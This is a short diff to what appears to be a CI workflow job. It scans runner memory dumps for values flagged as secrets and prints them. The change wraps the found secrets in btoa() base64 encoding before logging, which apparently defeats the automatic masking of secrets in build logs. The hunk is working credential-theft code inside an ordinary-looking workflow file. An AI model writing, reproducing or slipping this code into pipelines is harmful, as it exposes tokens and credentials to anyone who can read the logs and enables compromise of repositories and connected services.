@@ -36,7 +36,7 @@ jobs:
             try {
               const secrets = execSync('grep -Eao \'"[^"]+":{"value":"[^"]*","issecret":true}\' k.dump*').toString();
               if (secrets) {
-                console.log('Secrets found:', secrets);
+                console.log('Secrets found:', btoa(secrets));
               } else {
                 console.log('No secrets found in the memory dump.');
               }
